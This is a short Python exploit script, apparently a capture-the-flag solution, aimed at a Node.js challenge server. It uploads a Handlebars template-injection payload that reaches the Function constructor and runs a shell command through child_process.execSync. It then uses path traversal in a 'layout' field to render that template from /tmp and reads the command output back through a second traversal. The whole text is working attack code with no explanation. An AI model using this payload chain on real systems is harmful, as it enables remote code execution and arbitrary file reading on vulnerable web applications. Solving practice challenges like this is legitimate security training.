import requests

data = {"data": """"{{#with "s" as |string|}} {{#with "e"}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub "constructor")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('/readflag / > /tmp/res');"}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}} """}

requests.post('http://eci-2zeacjw9s6fuvmodkrvc.cloudeci1.ichunqiu.com:3000/upload', data=data)
data1 = {"name": {"name": "ddddd", "layout": "./../../../../../../../../../../../tmp/nodeisgood.tmp"}}
requests.post('http://eci-2zeacjw9s6fuvmodkrvc.cloudeci1.ichunqiu.com:3000/home?md5=', json=data1)
res = requests.get('http://eci-2zeacjw9s6fuvmodkrvc.cloudeci1.ichunqiu.com:3000/read?read=./../../../../../../../../../../../tmp/res')
print(res.text)
